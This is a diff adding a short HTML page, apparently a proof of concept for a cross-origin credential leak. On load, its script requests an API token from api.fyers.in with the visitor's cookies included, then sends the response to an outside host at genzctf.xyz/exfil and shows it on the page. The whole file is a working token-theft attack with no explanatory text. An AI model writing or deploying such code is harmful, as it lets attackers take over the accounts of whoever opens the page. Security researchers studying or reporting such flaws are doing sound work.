@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+  try {
+    const resp = await fetch('https://api.fyers.in/api/v2/token', {
+      credentials: 'include'
+    });
+    const text = await resp.text();
+    fetch('https://genzctf.xyz/exfil?data=' + encodeURIComponent(text));
+    document.body.innerHTML = '<pre>' + text + '</pre>';
+  } catch (e) {
+    document.body.innerHTML = 'Error: ' + e.message;
+  }
+})();
+</script>
+</body>
+</html>
